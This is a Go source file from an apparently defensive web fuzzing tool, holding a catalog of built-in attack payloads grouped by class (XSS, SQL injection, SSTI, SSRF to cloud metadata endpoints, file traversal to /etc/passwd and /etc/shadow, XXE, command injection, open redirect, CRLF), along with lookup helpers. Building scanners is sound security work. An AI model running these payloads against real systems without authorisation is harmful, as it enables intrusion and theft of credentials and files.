// Package payloads is the shared, provider-agnostic catalog of built-in attack
// payloads grouped by vulnerability class. It carries only static string data
// (no HTTP, no engine dependencies) so any package — the JS extension API
// (vigolium.payloads()), the fuzz engine (`--class`), modules — can pull a
// class's payloads without importing a heavier package.
//
// These are broad, human-readable starter payloads, not a confirmation engine:
// a class here is "the strings to try", not "how to decide it worked". Callers
// bring their own detection.
package payloads

import "sort"

// catalog maps a vulnerability class to its built-in payload list. Keys are the
// stable public class names surfaced by vigolium.payloads(type) and
// `vigolium fuzz --class`; do not rename without updating both call sites and
// their docs.
var catalog = map[string][]string{
	"xss": {
		`<script>alert(1)</script>`,
		`<img src=x onerror=alert(1)>`,
		`<svg onload=alert(1)>`,
		`"><script>alert(1)</script>`,
		`'><script>alert(1)</script>`,
		`javascript:alert(1)`,
		`<img/src=x onerror=alert(1)//`,
		`<body onload=alert(1)>`,
		`<details open ontoggle=alert(1)>`,
		`'-alert(1)-'`,
		`\"-alert(1)}//`,
	},
	"sqli": {
		`' OR '1'='1`,
		`" OR "1"="1`,
		`' OR 1=1--`,
		`" OR 1=1--`,
		`1' ORDER BY 1--`,
		`1 UNION SELECT NULL--`,
		`1 UNION SELECT NULL,NULL--`,
		`' AND 1=1--`,
		`' AND 1=2--`,
		`'; WAITFOR DELAY '0:0:5'--`,
		`1' AND SLEEP(5)--`,
		`' OR SLEEP(5)#`,
		`1; SELECT pg_sleep(5)--`,
	},
	"ssti": {
		`{{7*7}}`,
		`${7*7}`,
		`<%= 7*7 %>`,
		`{{7*'7'}}`,
		`#{7*7}`,
		`*{7*7}`,
		`{7*7}`,
		`{{config}}`,
		`{{self}}`,
		`${T(java.lang.Runtime).getRuntime()}`,
		`<#assign x=7*7>${x}`,
	},
	"ssrf": {
		`http://127.0.0.1`,
		`http://localhost`,
		`http://[::1]`,
		`http://0.0.0.0`,
		`http://169.254.169.254/latest/meta-data/`,
		`http://metadata.google.internal/computeMetadata/v1/`,
		`http://100.100.100.200/latest/meta-data/`,
		`http://2130706433`,   // 127.0.0.1 as decimal
		`http://0x7f000001`,   // 127.0.0.1 as hex
		`http://017700000001`, // 127.0.0.1 as octal
	},
	"lfi": {
		`../../../etc/passwd`,
		`....//....//....//etc/passwd`,
		`..%2f..%2f..%2fetc%2fpasswd`,
		`/etc/passwd`,
		`/etc/shadow`,
		`..\..\..\..\windows\win.ini`,
		`/proc/self/environ`,
		`/proc/self/cmdline`,
		`php://filter/convert.base64-encode/resource=index.php`,
		`file:///etc/passwd`,
	},
	"path_traversal": {
		`../../../etc/passwd`,
		`....//....//....//etc/passwd`,
		`..%2f..%2f..%2fetc%2fpasswd`,
		`..%252f..%252f..%252fetc%252fpasswd`,
		`..%c0%af..%c0%af..%c0%afetc/passwd`,
		`..%ef%bc%8f..%ef%bc%8fetc/passwd`,
		`/..;/..;/..;/etc/passwd`,
	},
	"xxe": {
		`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>`,
		`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><foo>&xxe;</foo>`,
		`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://127.0.0.1/">%xxe;]>`,
	},
	"cmdi": {
		`; id`,
		`| id`,
		"` id `",
		`$(id)`,
		`& id`,
		`|| id`,
		`; cat /etc/passwd`,
		`| cat /etc/passwd`,
		`$(cat /etc/passwd)`,
		`; ping -c 1 127.0.0.1`,
		`& ping -n 1 127.0.0.1`,
	},
	"open_redirect": {
		`//evil.com`,
		`https://evil.com`,
		`//evil.com/%2f..`,
		`/\evil.com`,
		`//evil%E3%80%82com`,
		`https:evil.com`,
		`////evil.com`,
		`https://evil.com@legitimate.com`,
	},
	"crlf": {
		`%0d%0aSet-Cookie:test=1`,
		`%0d%0aX-Injected:true`,
		`%0aSet-Cookie:test=1`,
		`\r\nSet-Cookie:test=1`,
		`%E5%98%8D%E5%98%8ASet-Cookie:test=1`,
	},
}

// classAliases maps convenient synonyms to canonical class names so callers
// (and agents) can use the obvious word. Canonical keys are those in catalog.
var classAliases = map[string]string{
	"traversal":    "path_traversal",
	"path":         "path_traversal",
	"cmd":          "cmdi",
	"command":      "cmdi",
	"rce":          "cmdi",
	"redirect":     "open_redirect",
	"openredirect": "open_redirect",
	"sql":          "sqli",
	"template":     "ssti",
}

// canonical resolves a class name or alias to its catalog key.
func canonical(class string) string {
	if _, ok := catalog[class]; ok {
		return class
	}
	if c, ok := classAliases[class]; ok {
		return c
	}
	return class
}

// ByClass returns a copy of the payloads for a vulnerability class (accepting
// aliases like "traversal" for "path_traversal"). ok is false for an unknown
// class. The slice is a copy, so callers may mutate it freely.
func ByClass(class string) (list []string, ok bool) {
	p, found := catalog[canonical(class)]
	if !found {
		return nil, false
	}
	out := make([]string, len(p))
	copy(out, p)
	return out, true
}

// Classes returns the canonical class names, sorted, for help text and
// validation.
func Classes() []string {
	names := make([]string, 0, len(catalog))
	for k := range catalog {
		names = append(names, k)
	}
	sort.Strings(names)
	return names
}
